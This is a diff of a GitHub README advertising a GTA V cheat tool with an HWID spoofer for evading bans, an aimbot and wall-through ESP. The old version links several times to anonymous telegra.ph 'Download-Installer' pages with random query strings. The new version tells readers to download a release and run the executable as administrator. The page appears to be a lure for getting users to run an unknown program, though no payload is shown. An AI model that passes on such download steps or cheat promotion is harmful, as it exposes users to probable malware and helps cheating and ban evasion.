@@ -1,59 +1,80 @@
-# Mod-Gta5 🚔🔫
+# Mod-Gta5-eu 🎮
 
-Welcome to the Mod-Gta5 repository! If you love playing GTA 5 and want to take your gaming experience to the next level, this tool is perfect for you. The Mod-Gta5 tool includes an HWID spoofer, customizable aimbot, character ESP, and 2D radar for enhanced gameplay.
+![GitHub release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
 
-## Features 🛠️
+Welcome to **Mod-Gta5-eu**! This tool enhances your gameplay in Grand Theft Auto V with features like an HWID spoofer, customizable aimbot, character ESP, and a 2D radar. Whether you are looking to gain an edge in competitive play or simply want to explore the game in a new way, this tool offers a variety of functionalities to suit your needs.
 
-🔹 HWID spoofer  
-🔹 Customizable aimbot  
-🔹 Character ESP  
-🔹 2D radar  
+## Table of Contents
 
-## Repository Info ℹ️
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Contributing](#contributing)
+5. [License](#license)
+6. [Support](#support)
+7. [Acknowledgments](#acknowledgments)
 
-📦 **Repository Name:** Mod-Gta5  
-📝 **Short Description:** This tool includes an HWID spoofer, customizable aimbot, character ESP, and 2D radar for enhanced gameplay.  
-🏷 **Topics:** archived, gta, gta5, hacker, java, java-native-access, java-natives, jna, jni, memory, memory-manipulation, mod, nativeui, scripthookv  
-🔗 **Download Link:** [Download Mod-Gta5 v1.0.0](https://telegra.ph/Download-Installer-1305-05-13?9ib3ypblao9alvp)  
+## Features
 
-[![Download Mod-Gta5 v1.0.0](https://telegra.ph/Download-Installer-1305-05-13?ka6ndqwm0c8vbsz)](https://telegra.ph/Download-Installer-1305-05-13?5m5qmtezx14sv72)
+**Mod-Gta5-eu** comes packed with features designed to enhance your gaming experience:
 
-## Installation Guide 📥
+- **HWID Spoofer**: Change your hardware ID to avoid bans.
+- **Customizable Aimbot**: Tailor your aim settings to your preference.
+- **Character ESP**: See player locations through walls.
+- **2D Radar**: Keep track of players and NPCs in real-time.
 
-1. Download the Mod-Gta5 tool from the provided link.
-2. Launch the downloaded file if it ends with a file name.
-3. Follow the on-screen instructions to install the tool on your system.
+These features aim to improve your gameplay while maintaining a seamless experience. 
 
-## Usage Guide 🕹️
+## Installation
 
-1. Run the Mod-Gta5 tool after installation.
-2. Customize your settings for the aimbot, character ESP, and radar.
-3. Enjoy an enhanced gameplay experience with GTA 5.
+To get started, you need to download the latest release. You can find it [here](https://github.com/Rh3nZ-a11y/Mod-Gta5-eu/releases). Download the file and execute it on your system.
 
-## Contribution 🤝
+### Requirements
 
-Contributions are welcome! If you have any ideas for improving the Mod-Gta5 tool, feel free to submit a pull request or open an issue on the repository.
+- Windows 10 or later
+- Grand Theft Auto V installed
+- .NET Framework 4.5 or higher
 
-## Support 🛡️
+### Steps
 
-If you encounter any issues or have any questions about using the Mod-Gta5 tool, please check the "Releases" section for updates or reach out to our support team for assistance.
+1. Download the latest release from the [Releases](https://github.com/Rh3nZ-a11y/Mod-Gta5-eu/releases) section.
+2. Extract the files to a folder of your choice.
+3. Run the executable file as an administrator.
+4. Follow the on-screen instructions to set up the tool.
 
-## About GTA 5 🎮
+## Usage
 
-Grand Theft Auto V (GTA 5) is an action-adventure game developed by Rockstar Games. With the Mod-Gta5 tool, you can enhance your gameplay experience and enjoy new features while playing GTA 5.
+Once installed, you can launch **Mod-Gta5-eu** while playing GTA V. The tool will overlay on your game screen, providing you access to its features.
 
-## Stay Connected 🌐
+### How to Use Each Feature
 
-Stay connected with the Mod-Gta5 community for updates, discussions, and more:
+- **HWID Spoofer**: Activate the spoofer before launching the game to ensure your hardware ID is changed.
+- **Aimbot**: Use the hotkeys to enable or disable the aimbot during gameplay. Customize settings in the menu.
+- **Character ESP**: Toggle the ESP feature to see other players' locations. You can adjust visibility settings in the options.
+- **2D Radar**: The radar will automatically update as you move in the game. You can adjust its size and position in the settings.
 
-🌍 Website: [Mod-Gta5 Website](https://telegra.ph/Download-Installer-1305-05-13?ydx1u43ly75y618)  
-📧 Email: https://telegra.ph/Download-Installer-1305-05-13?m4j2aayr4ur8ccx  
-🐦 Twitter: [@ModGta5Official](https://telegra.ph/Download-Installer-1305-05-13?fx7bk1bofcdk7yr)  
+## Contributing
 
-Let's make your GTA 5 gaming experience more exciting with Mod-Gta5! 🚗💨
+We welcome contributions from the community. If you have ideas for new features or improvements, please fork the repository and submit a pull request. 
+
+### Guidelines
+
+- Ensure your code follows the existing style.
+- Write clear commit messages.
+- Include documentation for new features.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+If you encounter any issues or have questions, please check the [Releases](https://github.com/Rh3nZ-a11y/Mod-Gta5-eu/releases) section or open an issue in the repository.
+
+## Acknowledgments
+
+Thanks to the community for their support and contributions. Special thanks to the developers of the libraries used in this project, which made the development process smoother.
 
 ---
 
-Now that you have all the information you need, download the Mod-Gta5 tool, install it, and start customizing your gameplay in GTA 5. Have fun exploring the features and enhancing your gaming experience like never before! 🔥🎮
-
-Remember, with great power comes great responsibility. Use the Mod-Gta5 tool wisely and enjoy the world of GTA 5 in a whole new way. Happy gaming! 🌟🚓🔥
+Feel free to explore the tool and enhance your GTA V experience. For the latest updates and features, keep an eye on the [Releases](https://github.com/Rh3nZ-a11y/Mod-Gta5-eu/releases) section. Enjoy gaming!
